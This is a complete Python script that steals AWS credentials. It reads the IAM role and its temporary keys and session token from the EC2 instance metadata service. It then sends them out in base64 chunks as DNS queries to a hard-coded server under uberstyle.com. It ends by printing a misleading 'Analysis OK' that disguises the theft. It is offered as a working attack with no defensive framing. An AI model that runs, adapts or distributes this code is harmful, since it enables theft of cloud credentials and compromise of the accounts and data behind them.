import requests
import base64
import socket
import time
import sys
from dnslib import DNSRecord

IMDS_BASE_URL = "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
DNS_SERVER = "10.192.26.214"
DOMAIN = "uberstyle.com"
DNS_PORT = 53
END_MARKER = "EOF"

def get_iam_role():
    try:
        response = requests.get(IMDS_BASE_URL, timeout=3)
        response.raise_for_status()
        return response.text.strip()
    except requests.RequestException as e:
        print(f"Error fetching IAM role: {e}")
        return None

def get_aws_credentials(role_name):
    try:
        response = requests.get(f"{IMDS_BASE_URL}{role_name}", timeout=3)
        response.raise_for_status()
        return response.json()
    except requests.RequestException as e:
        print(f"Error fetching AWS credentials: {e}")
        return None

def encode_data(data):
    """Base64-encode data and split into chunks for DNS exfiltration."""
    encoded = base64.urlsafe_b64encode(data.encode()).decode()
    chunks = [encoded[i:i+50] for i in range(0, len(encoded), 50)]
    chunks.append(END_MARKER)
    return chunks

def exfiltrate_dns(data):
    """Send encoded data as DNS queries to a forced DNS server."""
    for chunk in encode_data(data):
        subdomain = f"{chunk}.{DOMAIN}"
        try:
            query = DNSRecord.question(subdomain)
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            sock.sendto(query.pack(), (DNS_SERVER, DNS_PORT))
            print(f"Exfiltrated: {subdomain} via {DNS_SERVER}")
        except Exception as e:
            print(f"Failed to send DNS request for {subdomain}: {e}")
        finally:
            sock.close()

if __name__ == "__main__":
    role_name = get_iam_role()
    if role_name:
        print(f"Found IAM Role: {role_name}")
        creds = get_aws_credentials(role_name)
        if creds:
            sensitive_info = f"AWS_ACCESS_KEY_ID={creds.get('AccessKeyId')}&AWS_SECRET_ACCESS_KEY={creds.get('SecretAccessKey')}&AWS_SESSION_TOKEN={creds.get('Token')}"
            exfiltrate_dns(sensitive_info)
        else:
            print("Failed to retrieve AWS credentials.")
    else:
        print("No IAM role found.")
    time.sleep(2)
    print("Analysis OK")
    sys.exit(0)
